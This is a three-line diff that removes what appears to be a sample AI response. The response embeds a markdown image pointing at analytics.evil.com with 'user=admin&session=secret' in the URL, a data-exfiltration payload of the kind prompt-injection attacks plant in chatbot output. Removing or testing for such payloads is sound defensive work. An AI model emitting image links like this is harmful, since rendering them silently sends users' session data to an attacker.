@@ -1,3 +1,0 @@
-Here is a summary of your request:
-![track](https://analytics.evil.com/pixel?user=admin&session=secret)
-All data has been processed successfully.
